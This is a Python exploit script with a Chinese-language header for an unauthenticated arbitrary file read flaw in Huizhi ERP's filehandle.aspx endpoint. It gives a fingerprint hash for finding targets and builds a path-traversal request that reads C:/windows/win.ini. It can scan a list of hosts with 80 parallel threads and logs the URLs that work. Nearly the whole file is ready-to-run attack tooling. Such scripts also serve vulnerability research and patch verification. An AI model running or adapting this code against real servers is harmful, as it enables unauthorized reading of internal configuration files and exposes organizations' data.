# 汇智ERP filehandle.aspx 任意文件读取漏洞
# icon_hash="-642591392"
# 产品简介:汇智ERP是一款由江阴汇智软件技术有限公司开发的企业资源规划（ERP）软件，旨在通过信息化手段帮助企业优化业务流程，提升管理效率，增强综合竞争力。适用于各类企业，包括大型企业、中小型企业以及集团化企业。根据企业规模和业务需求，汇智ERP提供了不同的版本（如集团版和标准版），以满足企业的个性化需求。
# 漏洞概述:汇智ERP filehandle.aspx 接口处任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
\x1b[38m███████╗██████╗ ██████╗    ██████╗       ███████╗██╗██╗     ███████╗
\x1b[36m██╔════╝██╔══██╗██╔══██╗   ██╔══██╗      ██╔════╝██║██║     ██╔════╝
\x1b[34m█████╗  ██████╔╝██████╔╝   ██████╔╝█████╗█████╗  ██║██║     █████╗  
\x1b[35m██╔══╝  ██╔══██╗██╔═══╝    ██╔══██╗╚════╝██╔══╝  ██║██║     ██╔══╝  
\x1b[31m███████╗██║  ██║██║███████╗██║  ██║      ██║     ██║███████╗███████╗
\x1b[33m╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝      ╚═╝     ╚═╝╚══════╝╚══════╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>                                                                                                                                                    
    --author:Kucei  --Version:汇智ERP filehandle.aspx 任意文件读取漏洞
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<                                                  
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('汇智ERP_filehandle.aspx_任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/nssys/common/filehandle.aspx?filepath=C%3a%2fwindows%2fwin%2eini'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = {}
    try :
        response = requests.get(url=target+url_payload,headers=headers,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and 'files' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('汇智ERP_ReadingFile.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()